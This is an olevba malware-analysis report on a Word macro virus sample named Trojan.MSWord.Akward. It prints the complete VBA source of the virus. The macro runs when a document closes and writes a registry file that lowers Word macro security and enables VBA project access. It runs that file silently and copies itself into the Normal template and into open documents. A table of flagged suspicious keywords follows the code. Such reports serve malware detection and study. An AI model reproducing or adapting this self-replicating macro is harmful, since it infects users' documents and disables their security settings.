olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Akward-be425ad1eb39238839527414f5b70a8b8a2f2588
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Akward-be425ad1eb39238839527414f5b70a8b8a2f2588 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
 '
 Set act = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
 Set norm = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
 num = System.PrivateProfileString(FileName:="c:\windows.ini", Section:="awkward", Key:=1)
 If num <> "Private Sub test()" And act.lines(2, 1) = "'" Then
 For i = 1 To 48
 testvar$ = act.lines(i, 1)
 System.PrivateProfileString(FileName:="c:\windows.ini", Section:="awkward", Key:=i) = testvar$
 Next i
 Else
 For i = 1 To 48
 testvar$ = norm.lines(i, 1)
 System.PrivateProfileString(FileName:="c:\windows.ini", Section:="awkward", Key:=i) = testvar$
 Next i
 Open "c:\awkward.reg" For Output As 1
 Print #1, "REGEDIT4"
 Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
 Print #1, """Level""=dword:00000001"
 Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Office\10.0\Word\Security]"
 Print #1, """AccessVBOM""=dword:00000001"
 Close 1
 Shell "regedit /s c:\awkward.reg", vbHide
 End If
 If norm.lines(2, 1) <> "'" Then
 num = ""
 For i = 1 To 48
 num = num + System.PrivateProfileString(FileName:="c:\windows.ini", Section:="awkward", Key:=i)
 num = num + vbCrLf
 Next i
 norm.insertlines i, num
 norm.Save
 End If
 If act.lines(2, 1) <> "'" Then
 num = ""
 For i = 1 To 48
 num = num + System.PrivateProfileString(FileName:="c:\windows.ini", Section:="awkward", Key:=i)
 num = num + vbCrLf
 Next i
 act.insertlines 1, num
 ActiveDocument.SaveAs , FileName = ActiveDocument.FullName
 End If
 '...more awkward pirouettes
 'in the general direction of
 'hope and joy
 '[wXp/Pirouette]
 'The Usual Suspects ;D
 End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |awkward.reg         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

